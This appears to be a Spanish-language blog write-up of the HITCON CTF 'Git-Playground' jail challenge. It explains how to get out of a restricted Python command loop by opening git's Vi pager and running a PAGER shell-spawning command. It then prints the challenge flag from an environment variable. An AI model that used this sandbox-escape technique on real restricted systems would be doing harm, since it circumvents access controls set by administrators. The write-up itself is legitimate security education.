---
layout: post
title: Git-Playground
comments: true
categories: [Jail, Writeups]
---

Este era un ejercicio facilito de la HITCONCTF, pero creo que hay un par de conceptos interesantes sobre jails que podemos aprender.

<br>
![Image]({{ site.baseurl }}/images/posts/hitcon.webp){:width="300px"}

# Overview

La descripción del reto era:

> A simple git playground for you to test simple git commands.
> 
> Note that everything in the sandbox are either from public releases, distro tarballs, or built from unmodified upstream source with common toolchains under normal architectures. Nothing strange and weird here.

Si echamos un ojo al código, veremos un pequeño bucle en python que nos restringe los comandos que podemos ejecutar. Uno de los que si están disponibles es `git`.

# Exploitation

En este tipo de casos, si conseguimos abrir el *pager*, que en este caso es *Vi*, podremos ejecutar comandos escapando las restricciones. Para abrir el *pager* de *git* es tan fácil como:

```bash
git diff
```

Tras esto, podemos utilizar un comando como el siguiente para lanzar una shell:

```bash
!PAGER='sh -c "exec sh 0<&1"' git -p help
```

La flag se encuentra en una variable de entorno. Esto no me gustó, ya que estuve un rato buscando un archivo *flag*, pero tal vez se hizo para que pudiera ser resuelto sin necesida de conseguir una shell interactiva :V

```bash
/work # busybox env
FLAG=hitcon{Bu5yb0X_34511y_cR4sH_Wh3N_bu117_w17h_C14Ng?}
[...]
```

Me gustó bastante el reto, y me parece algo interesate para probar en entornos de sandbox.